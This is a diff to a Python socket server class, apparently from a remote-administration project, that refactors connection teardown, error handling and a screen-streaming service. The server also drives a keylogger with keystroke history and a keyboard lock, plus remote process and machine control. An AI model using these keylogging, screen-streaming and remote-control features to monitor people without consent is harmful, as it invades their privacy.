@@ -1,4 +1,4 @@
-import keyboard
+from app.core.exceptions import ReceivingError, SendingError
 import app.core.protocol as protocol
 import app.server.packages.keyboard_manip as keyboard_manip
 import app.server.packages.machine_manip as machine_manip
@@ -35,7 +35,7 @@ class Service:
             'machine': self._request_machine,
         }
 
-        self.stream_service = None
+        self.stream_service = StreamService()
 
     def start(self):
         """Starts listening for connection
@@ -53,7 +53,7 @@ class Service:
         logging.debug(f'Created listening socket ({self.listen_socket.getsockname()})')
 
         while not self.close_signal:
-            self.client_socket, add = self.listen_socket.accept()
+            self.client_socket, _ = self.listen_socket.accept()
             logging.debug(f'Connected to client {self.client_socket.getpeername()}, using socket {self.client_socket.getsockname()}')
             self.serve()
         self.close_signal = False
@@ -61,23 +61,32 @@ class Service:
     def stop(self):
         """Stops the client connection, and stops the service
         """
+        self.close_signal = True
         self.stop_client_connection()
-
         if self.listen_socket is not None:
             self.listen_socket.close()
-        self.close_signal = True
+            self.listen_socket = None
 
     def stop_client_connection(self):
         """Stops the current client connection only, does not stop the service
         """
-        logging.debug('Stoppping client connection')
+        logging.debug('Stopping client connection')
+        logging.debug('Clearing hook history')
+        keyboard_manip.keylogger.clear_history()
+        logging.debug('Unlocking keyboard')
+        keyboard_manip.keylogger.unlock()
+        logging.debug('Stoping streaming service')
+        self.stream_service.stop()
+        logging.debug('Closing client socket')
         if self.client_socket is not None:
             self.client_socket.close()
-            self.client_socket = None
-            logging.debug('Closed client socket')
-        keyboard_manip.keylogger.clear_history()
-        keyboard_manip.keylogger.unlock()
-        logging.debug('Stopped client connection')
+        self.client_socket = None
+
+    def is_alive(self):
+        return self.listen_socket is not None
+
+    def is_connected_to_client(self):
+        return self.client_socket is not None
 
     def serve(self):
         """Receives requests from `self.client_socket`, does the request
@@ -86,19 +95,18 @@ class Service:
         The method will not return until the connection is closed, either
         by the client or by the server.
         """
-        while True:
-            r = protocol.receive(self.client_socket)
-            if not r:
-                logging.debug('Receive NULL from client, stopping...')
-                self.stop_client_connection()
-                break
+        try:
+            while True:
+                r = protocol.receive(self.client_socket)
 
-            request = protocol.Request.from_bytes(r)
-            logging.debug(f'Doing request: {request.command()} {request.option()}')
+                request = protocol.Request.from_bytes(r)
+                logging.debug(f'Doing request: {request.command()} {request.option()}')
 
-            response = self.do_request(request)
-            logging.debug(f'Sending response: {response.status_code()} {response.status_message()}')
-            protocol.send(self.client_socket, response)
+                response = self.do_request(request)
+                logging.debug(f'Sending response: {response.status_code()} {response.status_message()}')
+                protocol.send(self.client_socket, response)
+        except (SendingError, ReceivingError):
+            self.stop_client_connection()
 
     def do_request(self, request: protocol.Request) -> protocol.Response:
         if request.command() not in self.request_functions_dict:
@@ -113,16 +121,15 @@ class Service:
         data = ''
 
         if option == '':
-            if self.stream_service is None:
+            if not self.stream_service.is_running():
                 logging.debug('Stream service is not running, initializing...')
-                self.stream_service = StreamService(
-                    peer=(self.client_socket.getpeername()[0], protocol.VIDEO_STREAM_PORT)
-                )
-                self.stream_service.connect_to_peer()
-                logging.debug('Created stream service')
+                if not self.stream_service.connect_to_peer(self.client_socket.getpeername()[0]):
+                    status_code = protocol.SC_ERROR_UNKNOWN
+                else:
+                    logging.debug('Created stream service')
             else:
                 status_code = protocol.SC_ERROR_UNKNOWN
-        elif self.stream_service is not None:
+        elif self.stream_service.is_running():
             if option == 'start':
                 logging.debug('Starting streaming...')
                 self.stream_service.start()
@@ -138,7 +145,6 @@ class Service:
             elif option == 'stop':
                 logging.debug('Stopping streaming...')
                 self.stream_service.stop()
-                self.stream_service = None
                 logging.debug('Stream service stopped')
         else:
             logging.debug('Stream service is not running')
@@ -161,7 +167,7 @@ class Service:
                           else protocol.SC_PROCESS_KILL_REQUEST_IS_DENIED if q == 2 \
                           else protocol.SC_PROCESS_CANNOT_KILL
 
-        return protocol.Response(status_code, data)
+        return protocol.Response(status_code, data.encode(protocol.MESSAGE_ENCODING))
 
     def _request_app(self, option, content) -> protocol.Response:
         status_code = protocol.SC_OK
